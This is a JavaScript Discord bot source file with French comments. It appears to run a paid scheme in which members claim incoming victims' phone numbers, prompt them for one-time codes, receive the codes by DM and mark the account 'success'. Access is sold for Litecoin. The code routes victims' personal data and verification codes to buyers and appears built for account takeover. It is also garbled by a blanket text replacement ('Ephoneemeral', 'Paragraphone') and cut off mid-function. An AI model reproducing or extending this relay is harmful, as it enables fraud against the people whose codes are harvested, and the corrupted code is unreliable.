// bot.js : version JavaScript complète (discord.js v14.19+ et driver mongodb v6+)
// npm install discord.js@latest mongodb
// package.json : "type": "module"
//
// Variables d'environnement : MONGO_URL, DB_NAME, DISCORD_TOKEN (facultatif si le token est dans la config en base)
//
// NOTE : l'auto-start en bas de fichier est désactivé car c'est server.js qui pilote
// startBot()/stopBot(). Si tu utilises bot.js seul, décommente la dernière section.
//
// NOTE IMPORTANTE : le système d'abonnement/accès (panel /timer, /add, Freeze Time,
// décompte, rôle acheteur) et la file d'attente (Join Queue / Leave Queue / routage)
// ont été entièrement retirés de ce bot — ils sont gérés par un autre bot désormais.
// Ce qui reste ici : claim des number (bouton OK), vérification otp (DECLINE/RETRY/SUCCESS),
// tickets (support/achat), leaderboard, broadcast et maintenance.

import {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  Client,
  ContainerBuilder,
  EmbedBuilder,
  GatewayIntentBits,
  MessageFlags,
  ModalBuilder,
  PermissionFlagsBits,
  SeparatorBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  TextDisplayBuilder,
  TextInputBuilder,
  TextInputStyle,
  parseEmoji,
} from "discord.js";
import { randomUUID } from "node:crypto";
import { MongoClient } from "mongodb";

// ---------- Logger (équivalent de logging.getLogger("bot")) ----------
export const log = {
  info: (...a) => console.log("[bot][INFO]", ...a),
  warn: (...a) => console.warn("[bot][WARN]", ...a),
  error: (...a) => console.error("[bot][ERROR]", ...a),
};

// ---------- Constantes ----------
// Les IDs Discord sont des chaînes : ils dépassent la précision d'un Number JS (2^53).
export const FREEZE_EMOJI = "<:ban:1542637913630838825>"; // réutilisé par le bouton "Close" des tickets
export const ALERT_EMOJI = "<a:Alert:1537938372822040716>";
export const FLASH_EMOJI = "<a:Flash:1542636354192805888>";
export const SHOP_EMOJI = "<a:shopping:1537938659716894731>";
export const CALL_EMOJI = "<:call:1543572200643240016>";
export const BELL_EMOJI = "<:bell:1542637989908320277>";
export const BAN_EMOJI = "<:ban:1542637913630838825>";
export const EDIT_EMOJI = "<:edit:1542638029309616128>";
export const PLUS_EMOJI = "<:plus:1543572780136792134>";

// ----- Système de tickets -----
export const TICKET_PANEL_CHANNEL_ID = "1560726846461448202";
export const TICKET_SUPPORT_CATEGORY_ID = "1560726802022793226";
export const TICKET_PURCHASE_CATEGORY_ID = "1560726814756970516";
export const TICKET_EMOJI = "<:ticket:1542791337785425991>";
export const MONEY_EMOJI2 = "<:money:1542638222029361212>";
export const GUIDE_EMOJI = "<:guide:1542638280858669156>";
export const SHOP_EMOJI2 = "<a:shopping:1537938659716894731>";
export const WARN_EMOJI2 = "<a:warnings:1537938330946240612>";
export const LTC_ADDRESS = "LZnytAtTzjGqUeLWHpkvhkK2U8z5f5fov5";

export const TICKET_PLANS = [
  { key: "12h", label: "12h", usd: 5 },
  { key: "24h", label: "24h", usd: 10 },
  { key: "48h", label: "48h", usd: 20 },
  { key: "life", label: "Lifetime", usd: 450 },
];

export const STAFF_ROLE_ID = "1560725991188467763"; // accès aux salons de tickets
export const BUYER_ROLE_ID = "1560692063865929728"; // seul ce rôle peut cliquer sur les boutons OK des embeds number

// ---------- État global (singleton) ----------
// `loop` n'existe plus : Node a une seule boucle d'événements.
export const state = {
  bot: null,
  task: null,
  status: "stopped", // stopped | starting | online | error
  lastError: null,
  db: null,
  mongo: null,
};

// ---------- Base de données ----------
export async function connectDb() {
  state.mongo = new MongoClient(process.env.MONGO_URL);
  await state.mongo.connect();
  state.db = state.mongo.db(process.env.DB_NAME);
}

// ---------- Config (stockée en base) ----------
const DEFAULT_CONFIG = {
  token: "",
  notify_channel_id: "", // salon où sont postés les number à claim (bouton OK)
  logs_channel_id: "",
  leaderboard_channel_id: "",
  leaderboard_message_id: "",
  leaderboard_title: "",
  leaderboard_desc: "",
  leaderboard_color: 0xfacc15,
  broadcast_channel_id: "",
  broadcast_title: "",
  broadcast_desc: "",
  broadcast_color: 0xfacc15,
  footer_text: "",
  maintenance_mode: false,
  maintenance_title: "🛠 Maintenance in progress",
  maintenance_desc:
    "The bot is temporarily down for maintenance. All requests are paused.",
  back_online_title: "✅ We're back",
  back_online_desc: "Maintenance is over. Everything is operational again.",
  ping_role_ids: [], // rôles à ping sur nouveau numéro
  ok_role_id: "", // rôle autorisé à appuyer sur OK
  embed_color: 0xfacc15,
  embed_title: "",
  embed_desc: "",
  ok_button_label: "OK",
  ok_button_style: "success", // primary/secondary/success/danger
  ok_button_emoji: "✅",
  hh_button_label: "",
  hh_button_style: "primary",
  hh_button_emoji: "",
};

export async function getConfig() {
  const doc = await state.db
    .collection("settings")
    .findOne({ key: "bot_config" });
  const defaults = structuredClone(DEFAULT_CONFIG);
  if (!doc) return defaults;
  return { ...defaults, ...(doc.value ?? {}) };
}

export async function saveConfig(patch = {}) {
  const current = { ...(await getConfig()), ...patch };
  await state.db
    .collection("settings")
    .updateOne(
      { key: "bot_config" },
      { $set: { value: current } },
      { upsert: true }
    );
  return current;
}

// ---------- Helpers ----------
export function styleMap(name) {
  const styles = {
    primary: ButtonStyle.Primary,
    secondary: ButtonStyle.Secondary,
    success: ButtonStyle.Success,
    danger: ButtonStyle.Danger,
  };
  return styles[name] ?? ButtonStyle.Success;
}

// Format équivalent à datetime.now(timezone.utc).isoformat() ("+00:00" au lieu de "Z"),
// pour que Python (fromisoformat avant 3.11) puisse encore relire ces dates.
export function nowIso() {
  return new Date().toISOString().replace("Z", "+00:00");
}

// Parse une date ISO ; sans fuseau explicite, on la considère en UTC (comme le code Python)
export function parseIsoUtc(s) {
  return /([zZ]|[+-]\d{2}:?\d{2})$/.test(s) ? new Date(s) : new Date(`${s}Z`);
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ---------- Views (Components V2) ----------
// Remplace la classe numberView. Usage : channel.send(buildnumberView(user, cfg))
// Un message Components V2 ne peut contenir ni `content` ni `embeds`.
export function buildnumberView(user, cfg, claimedBy = null) {
  const desc =
    cfg.embed_desc || "A new number just came in. Press the button to claim it.";
  const accent = claimedBy ? 0x22c55e : cfg.embed_color ?? 0xfacc15;

  const nick = user.nickname ?? "?";
  const geo = user.geo ?? {};
  const country = geo.country ?? "?";
  const city = geo.city ?? "?";

  let body =
    `# ${ALERT_EMOJI} New number received\n` +
    `${desc}\n\n` +
    `**Nickname**\u2003\`${nick}\`\n` +
    `**Country**\u2003${country}\n` +
    `**City**\u2003${city}`;

  if (claimedBy) body += `\n\n${FLASH_EMOJI} Claimed by ${claimedBy}`;

  const ft = (cfg.footer_text ?? "").trim();
  if (ft) body += `\n\n-# ${ft}`;

  const container = new ContainerBuilder()
    .setAccentColor(accent)
    .addTextDisplayComponents(new TextDisplayBuilder().setContent(body))
    .addSeparatorComponents(new SeparatorBuilder());

  let button;
  if (!claimedBy) {
    button = new ButtonBuilder()
      .setCustomId(`snap_ok:${user.id}`)
      .setLabel(cfg.ok_button_label || "OK")
      .setStyle(styleMap(cfg.ok_button_style ?? "success"));

    const emoji = (cfg.ok_button_emoji ?? "").trim();
    if (emoji) {
      try {
        button.setEmoji(emoji);
      } catch {
        /* emoji invalide : ignoré comme en Python */
      }
    }
  } else {
    button = new ButtonBuilder()
      .setCustomId("snap_claimed_done")
      .setLabel("Claimed")
      .setStyle(ButtonStyle.Secondary)
      .setEmoji(FLASH_EMOJI)
      .setDisabled(true);
  }

  container.addActionRowComponents(
    new ActionRowBuilder().addComponents(button)
  );

  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// ---------- DM "number claimed" (Components V2) ----------
function claimedBody(u, cfg, asked = false) {
  const geo = u.geo ?? {};
  let body =
    `# ${SHOP_EMOJI} number claimed\n` +
    `**Nickname**\u2003\`${u.nickname ?? "?"}\`\n` +
    `**phone**\u2003\`${u.phone ?? "?"}\`\n` +
    `**Location**\u2003${geo.city ?? "?"}, ${geo.country ?? "?"}`;

  if (asked) {
    body += `\n\n${CALL_EMOJI} otp requested \u2014 waiting for the user to type the username.`;
  }
  const ft = (cfg.footer_text ?? "").trim();
  if (ft) body += `\n\n-# ${ft}`;
  return body;
}

// Remplace la classe ClaimedView (+ otpButton).
// Usage : user.send(ClaimedView(u, cfg)) ou interaction.editReply(ClaimedView(u, cfg, true))
export function ClaimedView(u, cfg, asked = false) {
  const container = new ContainerBuilder()
    .setAccentColor(cfg.embed_color ?? 0xfacc15)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(claimedBody(u, cfg, asked))
    )
    .addSeparatorComponents(new SeparatorBuilder());

  const button = asked
    ? new ButtonBuilder()
        .setCustomId("snap_otp_done")
        .setLabel("Asked for otp")
        .setStyle(ButtonStyle.Secondary)
        .setEmoji(CALL_EMOJI)
        .setDisabled(true)
    : new ButtonBuilder()
        .setCustomId(`snap_otp:${u.id}`)
        .setLabel("Ask otp")
        .setStyle(ButtonStyle.Primary)
        .setEmoji(CALL_EMOJI);

  container.addActionRowComponents(
    new ActionRowBuilder().addComponents(button)
  );

  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// ---------- Helpers salons ----------
// get_channel + fetch_channel en un seul appel (discord.js utilise le cache d'abord)
async function getChannel(id) {
  try {
    return await state.bot.channels.fetch(String(id));
  } catch {
    return null;
  }
}

// ---------- Logs ----------
export async function logAction(text) {
  const cfg = await getConfig();
  const chId = (cfg.logs_channel_id ?? "").trim();
  if (!chId || !state.bot) return;
  try {
    const ch = await getChannel(chId);
    await ch.send(text);
  } catch (e) {
    log.warn(`logAction failed: ${e}`);
  }
}

// ---------- Appelé par votre API HTTP après une inscription ----------
// Retourne { ok, message } (en Python : un tuple (bool, str)).
export async function notifyNewRegistration(user) {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "bot offline" };
  }
  const cfg = await getConfig();
  const chId = (cfg.notify_channel_id ?? "").trim();
  if (!chId) return { ok: false, message: "no channel" };

  try {
    const ch = await getChannel(chId);
    const roleIds = (cfg.ping_role_ids ?? []).filter(Boolean);
    if (roleIds.length) {
      const mentions = roleIds.map((rid) => `<@&${rid}>`).join(" ");
      await ch.send({
        content: `||${mentions}||`,
        allowedMentions: { parse: ["roles"] },
      });
    }
    await ch.send(buildnumberView(user, cfg));
    return { ok: true, message: "sent" };
  } catch (e) {
    return { ok: false, message: String(e) };
  }
}

// ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
export async function notifyCodeSubmitted(user, code) {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "bot offline" };
  }
  const cfg = await getConfig();
  const presserId = user.discord_presser_id;

  try {
    if (presserId) {
      const uDisc = await state.bot.users.fetch(String(presserId));
      const embed = new EmbedBuilder()
        .setTitle("🎯 otp received")
        .setDescription(`**User:** \`${user.nickname}\`\n**phone:** \`${user.phone}\``)
        .setColor(0x22c55e)
        .addFields({ name: "Code", value: `\`\`\`${code}\`\`\``, inline: false });

      const ft = (cfg.footer_text ?? "").trim();
      if (ft) embed.setFooter({ text: ft });

      await uDisc.send({ embeds: [embed] });
    }

    await logAction(
      `📨 Code \`${code}\` received for \`${user.nickname}\`` +
        (presserId ? ` — DM sent to <@${presserId}>` : "")
    );
    return { ok: true, message: "sent" };
  } catch (e) {
    log.warn(`notify_code_submitted failed: ${e}`);
    return { ok: false, message: String(e) };
  }
}

// ---------- Callback du bouton OK ----------
export async function handleOkButton(interaction, userId) {
  // On accuse réception tout de suite (Discord exige une réponse sous 3 s).
  // La suite répond avec followUp (éphoneémère) ou editReply (message d'origine).
  await interaction.deferUpdate();

  const ephoneemeral = { flags: MessageFlags.Ephoneemeral };
  const cfg = await getConfig();
  const db = state.db;

  // maintenance
  if (cfg.maintenance_mode) {
    return interaction.followUp({
      content: "🛠 The bot is in maintenance mode. Please try again later.",
      ...ephoneemeral,
    });
  }

  // seul le rôle buyer peut cliquer sur OK
  const hasBuyerRole = interaction.member?.roles?.cache?.has(BUYER_ROLE_ID);
  if (!hasBuyerRole) {
    return interaction.followUp({
      content: "❌ You don't have permission to claim this ticket.",
      ...ephoneemeral,
    });
  }

  // vérification du rôle configurable additionnel (optionnel, via le panel admin)
  const okRole = (cfg.ok_role_id ?? "").trim();
  if (okRole) {
    const hasRole = interaction.member?.roles?.cache?.has(okRole);
    if (!hasRole) {
      return interaction.followUp({
        content: "❌ You don't have permission to claim this ticket.",
        ...ephoneemeral,
      });
    }
  }

  // CLAIM ATOMIQUE : seul le premier clic gagne
  const claimed = await db.collection("users").findOneAndUpdate(
    { id: userId, discord_presser_id: { $in: [null, ""] } },
    {
      $set: {
        discord_presser_id: interaction.user.id,
        updated_at: nowIso(),
      },
    },
    { returnDocument: "after" }
  );

  if (!claimed) {
    const existing = await db
      .collection("users")
      .findOne({ id: userId }, { projection: { _id: 0, discord_presser_id: 1 } });
    const other = existing?.discord_presser_id;
    return interaction.followUp({
      content: other
        ? `⚠️ Already claimed by <@${other}>.`
        : "⚠️ Already claimed.",
      ...ephoneemeral,
    });
  }

  const u = claimed;

  // DM : si impossible, on libère le claim
  try {
    await interaction.user.send(ClaimedView(u, cfg));
  } catch (err) {
    if (err.code === 50007) {
      await db
        .collection("users")
        .updateOne({ id: userId }, { $set: { discord_presser_id: null } });
      return interaction.followUp({
        content:
          "⚠️ I can't DM you. Enable DMs from server members. Claim released.",
        ...ephoneemeral,
      });
    }
    throw err;
  }

  // incrément du leaderboard (après le DM réussi, pour ne pas fausser le classement)
  await db.collection("presser_stats").updateOne(
    { discord_id: interaction.user.id },
    {
      $inc: { ok_count: 1 },
      $set: { username: interaction.user.username, last_at: nowIso() },
    },
    { upsert: true }
  );

  // log
  await logAction(
    `✅ <@${interaction.user.id}> pressed **OK** for \`${u.nickname}\``
  );

  // édition du message d'origine
  try {
    await interaction.editReply(
      buildnumberView(u, cfg, `<@${interaction.user.id}>`)
    );
  } catch (e) {
    log.warn(`editReply failed: ${e}`);
    await interaction
      .followUp({ content: "claimed.", ...ephoneemeral })
      .catch(() => {});
  }

  // refresh du leaderboard sans attendre (équivalent de asyncio.create_task)
  refreshLeaderboard().catch((e) => log.error(e));
}

// ---------- Callback du bouton "Ask otp" (dans le DM) ----------
export async function handleotpButton(interaction, userId) {
  await interaction.deferUpdate();

  const cfg = await getConfig();
  if (cfg.maintenance_mode) {
    return interaction.followUp({
      content: "🛠 The bot is in maintenance mode. Please try again later.",
      flags: MessageFlags.Ephoneemeral,
    });
  }

  const db = state.db;
  const u = await db.collection("users").findOne({ id: userId });
  if (!u) {
    return interaction.followUp({
      content: "User not found.",
      flags: MessageFlags.Ephoneemeral,
    });
  }

  await db
    .collection("users")
    .updateOne(
      { id: userId },
      { $set: { state: "code", updated_at: nowIso() } }
    );

  try {
    await interaction.editReply(ClaimedView(u, cfg, true));
  } catch (e) {
    log.warn(`editReply (otp) failed: ${e}`);
  }

  await logAction(
    `🔑 <@${interaction.user.id}> pressed **otp** for \`${u.nickname}\``
  );
}

// ---------- otp : panel de vérification (DM à l'admin) ----------
function otpBody(nickname, phone, code, cfg) {
  let body =
    `# ${BELL_EMOJI} otp received\n` +
    `**User**\u2003\`${nickname}\`\n` +
    `**phone**\u2003\`${phone}\`\n\n` +
    `**Code**\n\`\`\`${code}\`\`\``;
  const ft = (cfg.footer_text ?? "").trim();
  if (ft) body += `\n-# ${ft}`;
  return body;
}

function otpResultBody(title, nickname, phone, extra = "") {
  let body =
    `# ${title}\n` +
    `**User**\u2003\`${nickname}\`\n` +
    `**phone**\u2003\`${phone}\``;
  if (extra) body += `\n\n${extra}`;
  return body;
}

// Remplace otpResultView : état final après DECLINE / RETRY / SUCCESS (sans boutons)
export function buildotpResultView(title, nickname, phone, accent, extra = "") {
  const container = new ContainerBuilder()
    .setAccentColor(accent)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        otpResultBody(title, nickname, phone, extra)
      )
    );
  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// Remplace otpVerificationView : 3 boutons dans le container.
// L'id de l'utilisateur est mis dans le customId (snap_decline:<id>, etc.) car il
// n'y a plus d'instance de classe pour le mémoriser. Le nickname et le phone sont
// relus en base au clic : les boutons marchent aussi après un redémarrage du bot.
export function buildotpVerificationView(userId, nickname, phone, code = "", cfg = {}) {
  const declineBtn = new ButtonBuilder()
    .setCustomId(`snap_decline:${userId}`)
    .setLabel("DECLINE")
    .setStyle(ButtonStyle.Danger)
    .setEmoji(BAN_EMOJI);
  const retryBtn = new ButtonBuilder()
    .setCustomId(`snap_retry:${userId}`)
    .setLabel("RETRY")
    .setStyle(ButtonStyle.Primary)
    .setEmoji(EDIT_EMOJI);
  const successBtn = new ButtonBuilder()
    .setCustomId(`snap_success:${userId}`)
    .setLabel("SUCCESS")
    .setStyle(ButtonStyle.Success)
    .setEmoji(PLUS_EMOJI);

  const container = new ContainerBuilder()
    .setAccentColor(0x22c55e)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(otpBody(nickname, phone, code, cfg))
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addActionRowComponents(
      new ActionRowBuilder().addComponents(declineBtn, retryBtn, successBtn)
    );

  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// Relit l'utilisateur en base ; répond en éphoneémère s'il n'existe pas
async function loadotpUser(interaction, userId) {
  const u = await state.db.collection("users").findOne({ id: userId });
  if (!u) {
    await interaction.followUp({
      content: "User not found.",
      flags: MessageFlags.Ephoneemeral,
    });
  }
  return u;
}

// DECLINE : ouvre le modal (showModal doit être la toute première réponse, pas de defer avant)
export async function handleDeclineButton(interaction, userId) {
  const modal = new ModalBuilder()
    .setCustomId(`snap_decline_modal:${userId}`)
    .setTitle("Decline number")
    .addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("reason")
          .setLabel("Write a comment (optional)")
          .setPlaceholder("Why are you declining this number?")
          .setStyle(TextInputStyle.Paragraphone)
          .setMaxLength(500)
          .setRequired(false)
      )
    );
  await interaction.showModal(modal);
}

// Soumission du modal (DeclineReasonModal.on_submit)
export async function handleDeclineModal(interaction, userId) {
  await interaction.deferUpdate();

  const db = state.db;
  const u = await loadotpUser(interaction, userId);
  if (!u) return;

  const comment = (interaction.fields.getTextInputValue("reason") ?? "").trim();

  await db.collection("users").updateOne(
    { id: userId },
    {
      $set: {
        state: "declined",
        decline_reason: comment,
        declined_by_id: interaction.user.id,
        updated_at: nowIso(),
      },
    }
  );
  await db.collection("action_logs").insertOne({
    id: randomUUID(),
    action: "USER_DECLINED",
    user_id: userId,
    username: u.nickname,
    phone: u.phone,
    reason: comment,
    discord_user_id: interaction.user.id,
    discord_username: interaction.user.username,
    created_at: nowIso(),
  });
  await logAction(
    `USER_DECLINED, <@${interaction.user.id}>, (${comment || "no comment"}) — \`${u.nickname}\``
  );

  try {
    const extra = comment ? `Comment: ${comment}` : "";
    await interaction.editReply(
      buildotpResultView(`${BAN_EMOJI} Declined`, u.nickname, u.phone, 0xef4444, extra)
    );
  } catch {
    await interaction
      .followUp({ content: "❌ Declined.", flags: MessageFlags.Ephoneemeral })
      .catch(() => {});
  }
}

// RETRY
export async function handleRetryButton(interaction, userId) {
  await interaction.deferUpdate();

  const db = state.db;
  const u = await loadotpUser(interaction, userId);
  if (!u) return;

  await db.collection("users").updateOne(
    { id: userId },
    {
      $set: {
        state: "code",
        code_submitted: null,
        error_message: "Wrong",
        updated_at: nowIso(),
      },
    }
  );
  await db.collection("action_logs").insertOne({
    id: randomUUID(),
    action: "RETRY_CODE",
    user_id: userId,
    username: u.nickname,
    phone: u.phone,
    discord_user_id: interaction.user.id,
    created_at: nowIso(),
  });
  await logAction(
    `RETRY_CODE, <@${interaction.user.id}> \u2014 \`${u.nickname}\``
  );

  try {
    await interaction.editReply(
      buildotpResultView(
        `${EDIT_EMOJI} Retry requested`,
        u.nickname,
        u.phone,
        0x3b82f6,
        "The user has been sent back to the code form. No new code was generated \u2014 they re-enter the one they already got."
      )
    );
  } catch (e) {
    log.warn(`retry editReply failed: ${e}`);
  }
}

// SUCCESS
export async function handleSuccessButton(interaction, userId) {
  await interaction.deferUpdate();

  const db = state.db;
  const u = await loadotpUser(interaction, userId);
  if (!u) return;

  await db.collection("users").updateOne(
    { id: userId },
    {
      $set: {
        state: "success",
        approved_by_admin: interaction.user.username,
        approved_by_id: interaction.user.id,
        verified_at: nowIso(),
        updated_at: nowIso(),
      },
    }
  );
  await db.collection("action_logs").insertOne({
    id: randomUUID(),
    action: "ADMIN_APPROVED",
    user_id: userId,
    username: u.nickname,
    phone: u.phone,
    approved_by: interaction.user.username,
    discord_user_id: interaction.user.id,
    created_at: nowIso(),
  });
  await logAction(
    `ADMIN_APPROVED, <@${interaction.user.id}> \u2014 \`${u.nickname}\``
  );

  try {
    await interaction.editReply(
      buildotpResultView(
        `${PLUS_EMOJI} Success`,
        u.nickname,
        u.phone,
        0x22c55e,
        "Access approved."
      )
    );
  } catch (e) {
    log.warn(`success editReply failed: ${e}`);
  }
}

// ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
// DM à l'admin qui a pris le ticket : code + 3 boutons.
export async function notifyotpReceived(user, code) {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "bot offline" };
  }
  const cfg = await getConfig();
  const presserId = user.discord_presser_id;

  if (!presserId) {
    await logAction(
      `⚠️ otp ricevuto per \`${user.nickname}\` ma nessun admin ha claimato.`
    );
    return { ok: false, message: "no presser" };
  }

  try {
    const uDisc = await state.bot.users.fetch(String(presserId));
    const msg = await uDisc.send(
      buildotpVerificationView(user.id, user.nickname, user.phone, code, cfg)
    );
    await state.db
      .collection("users")
      .updateOne({ id: user.id }, { $set: { otp_message_id: msg.id } });
    await logAction(
      `📨 otp \`${code}\` ricevuto per \`${user.nickname}\` — DM a <@${presserId}>`
    );
    return { ok: true, message: "sent" };
  } catch (e) {
    log.warn(`notify_otp_received failed: ${e}`);
    return { ok: false, message: String(e) };
  }
}

// ---------- Tickets ----------
function ticketPanelBody() {
  return (
    `# ${TICKET_EMOJI} Purchase Tickets\n` +
    `Create a ticket to purchase access to all features of the server.`
  );
}

function ticketInfoBody() {
  const m = "<a:033:1543901374897725494>";
  return (
    `<a:032:1544044144060665916> **Pricing** \u2014 ` +
    `12h: $5 ${m} \u00B7 24h: $10 ${m} \u00B7 48h: $20 ${m} \u00B7 Lifetime: $450 ${m}\n\n` +
    `<a:088:1544044277481480273> **How access time works** \u2014 ` +
    `Your subscription is a burn balance.\n\n` +
    `<a:074:1544043832084267098> **Freeze Time** \u2014 Buying N hours grants N burn + ` +
    `N freeze (1:1). In the panel you can press Stop Time to freeze your timer.\n` +
    `\u2022 Freeze Time only works while Ads can run \u2014 outside the schedule it does not apply.\n` +
    `\u2022 While frozen, queue join access is blocked until you resume.\n` +
    `\u2022 Example: 24h access = 24h Freeze Time.\n` +
    `\u2022 Neither balance resets until your subscription ends, or you renew / buy more hours.\n\n` +
    `<a:031:1543903212145483838> **Note** \u2014 Only crypto payments via Litecoin are accepted for purchases.`
  );
}

// Remplace TicketPanelView + TicketCategorySelect
export function buildTicketPanelView() {
  const select = new StringSelectMenuBuilder()
    .setCustomId("snapplus:ticket_category")
    .setPlaceholder("Select a ticket category to open")
    .setMinValues(1)
    .setMaxValues(1)
    .addOptions(
      new StringSelectMenuOptionBuilder()
        .setLabel("Purchase")
        .setValue("purchase")
        .setEmoji(parseEmoji(MONEY_EMOJI2)),
      new StringSelectMenuOptionBuilder()
        .setLabel("Support")
        .setValue("support")
        .setEmoji(parseEmoji(GUIDE_EMOJI))
    );
  const container = new ContainerBuilder()
    .setAccentColor(0x4a9eff)
    .addTextDisplayComponents(new TextDisplayBuilder().setContent(ticketPanelBody()))
    .addSeparatorComponents(new SeparatorBuilder())
    .addTextDisplayComponents(new TextDisplayBuilder().setContent(ticketInfoBody()))
    .addSeparatorComponents(new SeparatorBuilder())
    .addActionRowComponents(new ActionRowBuilder().addComponents(select));
  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

function closeTicketRow() {
  const closeBtn = new ButtonBuilder()
    .setCustomId("snapplus:close_ticket")
    .setLabel("Close")
    .setStyle(ButtonStyle.Danger)
    .setEmoji(FREEZE_EMOJI);
  return new ActionRowBuilder().addComponents(closeBtn);
}

// Message d'accueil dans un ticket support (bleu, bouton Close dedans)
export function buildSupportTicketView() {
  const body =
    `# ${TICKET_EMOJI} Support Ticket\n` +
    `Thanks for opening a ticket. Describe your issue and our staff will ` +
    `help you shortly.\n\n` +
    `Press **Close** when you're done.`;
  const container = new ContainerBuilder()
    .setAccentColor(0x4a9eff)
    .addTextDisplayComponents(new TextDisplayBuilder().setContent(body))
    .addSeparatorComponents(new SeparatorBuilder())
    .addActionRowComponents(closeTicketRow());
  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// Facture de paiement dans un ticket d'achat
export function buildInvoiceView(planLabel, usd, ltcStr) {
  const body =
    `# ${SHOP_EMOJI2} Payment Invoice\n` +
    `Send the Litecoin amount to the address below.\n\n` +
    `${WARN_EMOJI2} **REMEMBER** \u2014 DON'T PAY ANY OF THE STAFF TEAM. ` +
    `PAY ONLY THIS LTC ADDRESS.\n\n` +
    `**\u{1F4E6} Plan**\n\`\`\`${planLabel} (\$${usd} USD)\`\`\`\n` +
    `**\u{1FA99} LTC Amount**\n\`\`\`${ltcStr}\`\`\`\n` +
    `**\u{1F3E6} Payment Address**\n\`\`\`${LTC_ADDRESS}\`\`\``;
  const container = new ContainerBuilder()
    .setAccentColor(0x4a9eff)
    .addTextDisplayComponents(new TextDisplayBuilder().setContent(body))
    .addSeparatorComponents(new SeparatorBuilder())
    .addActionRowComponents(closeTicketRow());
  return { components: [container], flags: MessageFlags.IsComponentsV2 };
}

// Sélecteur de plan éphoneémère (affiché après "Purchase")
export function buildPlanSelectView() {
  const select = new StringSelectMenuBuilder()
    .setCustomId("snapplus:plan_select")
    .setPlaceholder("Select an access plan to continue")
    .setMinValues(1)
    .setMaxValues(1)
    .addOptions(
      TICKET_PLANS.map((p) =>
        new StringSelectMenuOptionBuilder()
          .setLabel(`${p.label}  |  $${p.usd}`)
          .setValue(p.key)
          .setEmoji(parseEmoji(MONEY_EMOJI2))
      )
    );
  const container = new ContainerBuilder()
    .setAccentColor(0x4a9eff)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `# ${MONEY_EMOJI2} Select an access plan\nChoose a plan below to continue to payment.`
      )
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addActionRowComponents(new ActionRowBuilder().addComponents(select));
  return {
    components: [container],
    flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephoneemeral,
  };
}

// Retourne un ticket existant appartenant à l'utilisateur, ou undefined
function findUserTicket(guild, userId) {
  const catIds = new Set([TICKET_SUPPORT_CATEGORY_ID, TICKET_PURCHASE_CATEGORY_ID]);
  return guild.channels.cache.find(
    (ch) =>
      ch.type === ChannelType.GuildText &&
      catIds.has(ch.parentId) &&
      (ch.topic ?? "").includes(`owner:${userId}`)
  );
}

// Crée un salon de ticket privé. L'interaction doit déjà avoir été différée (deferReply).
// Retourne le salon, ou null (après avoir répondu).
async function openTicket(interaction, categoryId, kind) {
  const guild = interaction.guild;
  const user = interaction.user;
  const say = (content) => interaction.editReply({ content });

  const existing = findUserTicket(guild, user.id);
  if (existing) {
    await say(`You already have an open ticket: <#${existing.id}>`);
    return null;
  }

  const category = await guild.channels.fetch(categoryId).catch(() => null);
  if (!category) {
    await say("\u274C Ticket category not found.");
    return null;
  }

  const staffRole = await guild.roles.fetch(STAFF_ROLE_ID).catch(() => null);
  const me = guild.members.me ?? (await guild.members.fetchMe());
  const view = PermissionFlagsBits.ViewChannel;
  const send = PermissionFlagsBits.SendMessages;
  const overwrites = [
    { id: guild.roles.everyone.id, deny: [view] },
    { id: user.id, allow: [view, send] },
    { id: me.id, allow: [view, send] },
  ];
  if (staffRole) overwrites.push({ id: staffRole.id, allow: [view, send] });

  let channel;
  try {
    channel = await guild.channels.create({
      name: `${kind}-${user.username}`,
      type: ChannelType.GuildText,
      parent: category.id,
      permissionOverwrites: overwrites,
      topic: `owner:${user.id}`,
    });
  } catch (e) {
    await say(`\u274C Failed to open ticket: ${e.message ?? e}`);
    return null;
  }

  // message initial : ping du rôle staff + du membre
  try {
    await channel.send({
      content: `<@&${STAFF_ROLE_ID}> <@${user.id}>`,
      allowedMentions: { roles: [STAFF_ROLE_ID], users: [user.id] },
    });
  } catch {
    /* ignoré */
  }

  return channel;
}

// TicketCategorySelect.callback
export async function handleTicketCategorySelect(interaction) {
  const choice = interaction.values[0];
  if (choice === "support") {
    await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
    const channel = await openTicket(interaction, TICKET_SUPPORT_CATEGORY_ID, "support");
    if (!channel) return;
    await channel.send(buildSupportTicketView());
    await interaction.editReply({ content: `\u2705 Ticket opened: <#${channel.id}>` });
  } else if (choice === "purchase") {
    await interaction.reply(buildPlanSelectView());
  }
}

// CloseTicketButton.callback
export async function handleCloseTicketButton(interaction) {
  await interaction.reply({ content: "Closing in 5 seconds..." });
  await sleep(5000);
  try {
    await interaction.channel.delete("Ticket closed");
  } catch (e) {
    log.warn(`close ticket failed: ${e}`);
  }
}

// Convertit des USD en LTC via CoinGecko. Retourne un nombre, ou null en cas d'échec.
async function usdToLtc(usd) {
  const url =
    "https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd";
  try {
    const resp = await fetch(url, { signal: AbortSignal.timeout(10_000) });
    if (!resp.ok) return null;
    const data = await resp.json();
    const rate = Number(data.litecoin.usd);
    if (!(rate > 0)) return null;
    return Math.round((usd / rate) * 1e6) / 1e6;
  } catch (e) {
    log.warn(`usd_to_ltc failed: ${e}`);
    return null;
  }
}

function planByKey(key) {
